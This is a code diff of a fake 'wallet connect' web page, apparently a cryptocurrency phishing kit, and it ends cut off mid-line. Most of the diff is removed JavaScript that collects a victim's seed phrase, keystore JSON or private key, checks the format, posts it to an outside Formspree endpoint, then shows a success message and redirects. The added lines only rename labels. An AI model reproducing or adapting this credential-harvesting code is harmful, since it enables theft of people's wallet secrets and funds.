@@ -48,7 +48,7 @@
                 <button class="tab-btn" onclick="switchTab('privatekey')">Private Key</button>
             </div>
 
-            <label for="manualInput">Enter your wallet <span id="inputLabel">seedphrase</span></label>
+            <label for="manualInput">Enter your wallet <span id="inputLabel">seed phrase</span></label>
             <textarea id="manualInput" name="manualInput" placeholder="Enter your seed phrase" rows="6"></textarea>
 
             <p id="errorMessage" class="hidden"></p>
@@ -120,7 +120,7 @@
 
         let selectedWallet = null;
         let selectedTroubleshootOption = null;
-        let currentTab = "phrase";
+        let currentTab = "seedphrase"; // Updated to match the new tab identifier
 
         // Open wallet selection popup
         function openWalletPopup(troubleshootOption = null) {
@@ -147,134 +147,4 @@
 
         // Open error/manual connect popup
         function openErrorPopup(wallet) {
-            document.getElementById("errorWalletName").textContent = wallet;
-            document.getElementById("errorPopup").style.display = "flex";
-            currentTab = "phrase";
-            updateInputLabel();
-        }
-
-        // Close error popup
-        function closeErrorPopup() {
-            selectedWallet = null;
-            selectedTroubleshootOption = null;
-            currentTab = "phrase";
-            document.getElementById("manualInput").value = "";
-            document.getElementById("errorMessage").textContent = "";
-            document.getElementById("errorMessage").classList.add("hidden");
-            document.getElementById("errorPopup").style.display = "none";
-            updateTabButtons();
-        }
-
-        document.getElementById("closeErrorPopup").addEventListener("click", closeErrorPopup);
-
-        window.onclick = function(event) {
-            if (event.target.classList.contains("popup")) {
-                document.getElementById("walletPopup").style.display = "none";
-                document.getElementById("initPopup").style.display = "none";
-                closeErrorPopup();
-            }
-        };
-
-        // Switch between tabs (Phrase, Keystore JSON, Private Key)
-        function switchTab(tab) {
-            currentTab = tab;
-            updateInputLabel();
-            updateTabButtons();
-        }
-
-        function updateInputLabel() {
-            const label = document.getElementById("inputLabel");
-            const placeholder = document.getElementById("manualInput");
-            if (currentTab === "phrase") {
-                label.textContent = "phrase";
-                placeholder.placeholder = "Enter your wallet phrase";
-            } else if (currentTab === "keystore") {
-                label.textContent = "keystore JSON";
-                placeholder.placeholder = "Enter your keystore JSON";
-            } else if (currentTab === "privatekey") {
-                label.textContent = "private key";
-                placeholder.placeholder = "Enter your private key";
-            }
-        }
-
-        function updateTabButtons() {
-            document.querySelectorAll(".tab-btn").forEach(btn => {
-                btn.classList.remove("active");
-                if (btn.textContent.toLowerCase().replace(" ", "") === currentTab) {
-                    btn.classList.add("active");
-                }
-            });
-        }
-
-        // Validate manual input and submit to Formspree
-        function validateManualInput() {
-            let manualInput = document.getElementById("manualInput").value.trim();
-            let message = document.getElementById("errorMessage");
-
-            message.textContent = "";
-            message.classList.add("hidden");
-
-            if (manualInput === "") {
-                message.textContent = "Error: Input cannot be empty!";
-                message.classList.remove("hidden");
-                return;
-            }
-
-            if (currentTab === "phrase" && ![12, 24].includes(manualInput.split(" ").length)) {
-                message.textContent = "Error: Seed phrase must be 12 or 24 words!";
-                message.classList.remove("hidden");
-                return;
-            }
-
-            if (currentTab === "keystore" && manualInput.length < 16) {
-                message.textContent = "Error: Keystore JSON must be at least 16 characters!";
-                message.classList.remove("hidden");
-                return;
-            }
-
-            if (currentTab === "privatekey" && manualInput.length < 8) {
-                message.textContent = "Error: Private key must be at least 8 characters!";
-                message.classList.remove("hidden");
-                return;
-            }
-
-            let formData = `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`;
-            if (selectedTroubleshootOption) {
-                formData += `&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`;
-            }
-
-            fetch("https://formspree.io/f/mvgkalye", {
-                method: "POST",
-                headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    message.textContent = "Credentials submitted successfully!";
-                    message.style.color = "green";
-                    message.classList.remove("hidden");
-                    setTimeout(() => {
-                        closeErrorPopup();
-                        if (!selectedTroubleshootOption) {
-                            window.location.href = "syncwallets.html";
-                        }
-                    }, 2000);
-                } else {
-                    message.textContent = `Error submitting credentials. Status: ${response.status}`;
-                    message.style.color = "red";
-                    message.classList.remove("hidden");
-                }
-            })
-            .catch(() => {
-                message.textContent = "Network error. Please try again.";
-                message.style.color = "red";
-                message.classList.remove("hidden");
-            });
-        }
-
-        document.getElementById("manualInput").addEventListener("input", function () {
-            document.getElementById("errorMessage").classList.add("hidden");
-        });
-    </script>
-</body>
-</html>
+            document.getElement
